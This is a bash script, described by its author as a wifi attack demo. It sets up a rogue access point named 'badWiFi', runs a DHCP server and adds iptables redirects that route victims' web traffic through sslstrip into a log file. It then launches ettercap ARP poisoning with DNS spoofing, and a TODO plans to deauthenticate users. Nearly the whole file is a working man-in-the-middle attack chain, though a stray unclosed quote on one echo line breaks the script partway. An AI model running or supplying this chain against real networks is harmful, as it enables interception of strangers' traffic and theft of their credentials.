#!/bin/bash

######################################################################################

# Author: Alex Walker
#Script to demo some attacks that could be done using wifi.
#TODO: deauth a user and take their connection by copying their SSID

######################################################################################

airmon-ng start wlan1

#    Figure out what your monitor interface is, Chances are its mon0:
ifconfig -a
gnome-terminal -x airbase-ng -P -e "badWiFi" mon0 & #open in new window

#    Find out what the AP interface is (normally starts with "at"):
sleep 5
ifconfig -a

#Start the external interface
ifconfig at0 up 192.168.121.1 netmask 255.255.255.0

#start the dhcp server
service isc-dhcp-server start

#setup redirection for SSL Stripping
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080
iptables -t nat -A POSTROUTING -o wlan0 -s 192.168.121.0/24 -j MASQUERADE
#forward connections
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 1
gnome-terminal -x sslstrip -l 8080 -w log.txt
sleep 1
gedit log.txt
#Now for ettercap demo
echo "Are you ready to move the demo on?
read
Remove SSL Strip port forwards
iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080 > /dev/null 2>&1
iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080 > /dev/null 2>&1

sleep 2

/opt/lampp/lampp restart
ettercap -T -q -i at0 -P dns_spoof -M arp // //
